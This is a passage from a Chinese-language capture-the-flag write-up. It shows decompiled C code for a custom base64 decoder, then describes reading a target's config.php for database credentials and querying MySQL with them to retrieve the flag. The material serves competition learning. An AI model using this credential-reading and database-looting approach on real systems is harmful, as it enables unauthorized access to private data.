  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="n">remixed</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">remixed</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">remixed</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">do</span>
    <span class="p">{</span>
      <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">num_strchr</span><span class="p">(</span><span class="n">remixedchar</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="n">num_strchr</span><span class="p">(</span><span class="n">remixedchar</span><span class="p">,</span> <span class="o">*</span><span class="n">v4</span><span class="p">);</span>
        <span class="n">v2</span><span class="p">[(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span> <span class="o">|</span> <span class="p">(</span><span class="n">v9</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">61</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
        <span class="n">v4</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
          <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">num_strchr</span><span class="p">(</span><span class="n">remixedchar</span><span class="p">,</span> <span class="n">v4</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="n">v2</span><span class="p">[(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xF</span> <span class="o">|</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">v9</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mi">61</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">j</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
        <span class="n">v2</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_strchr</span><span class="p">(</span><span class="n">remixedchar</span><span class="p">,</span> <span class="n">v4</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0x3F</span> <span class="o">|</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="n">v4</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">v4</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">);</span>
<span class="nl">LABEL_8</span><span class="p">:</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v5</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">v2</span><span class="p">[</span><span class="n">v5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>问了一下队里面的re师傅，说这个是base64，尝试一下发现可以</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162510-dc15f934-c25a-1.png"/></p>
<p>但是发现都找不到flag，通过之前扫描出来的<code>config.php</code>，猜测flag应该在数据库里面，读一下config文件得到数据库用户密码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162734-31db9194-c25b-1.png"/></p>
<p><code>show databases</code>一下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162955-85c05ce0-c25b-1.png"/></p>
<p><code>use flag;show tables</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163517-45b571e8-c25c-1.png"/></p>
<p><code>select * from flag.flag</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163559-5efc045a-c25c-1.png"/></p>
</div>
</div>